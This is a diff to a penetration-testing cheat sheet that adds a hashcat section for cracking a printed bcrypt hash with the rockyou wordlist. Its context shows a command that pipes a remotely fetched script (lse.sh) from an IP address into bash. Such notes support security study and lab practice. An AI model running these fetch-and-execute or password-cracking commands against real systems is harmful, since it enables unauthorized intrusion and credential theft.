@@ -10,6 +10,7 @@
   - [wfuzz](#wfuzz)
   - [wget](#wget)
   - [Python](#python)
+  - [hashcat](#hashcat)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -125,6 +126,14 @@ wget -O - http://192.168.45.175:443/lse.sh | bash
 # When encoding characters;
 python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = urllib.parse.quote(original_string); print(url_encoded_string);'
 %0A
+```
+
+### Hashcat
+```bash
+# $2a: 3200
+($2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS)
+hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force
+
 
 ```
 
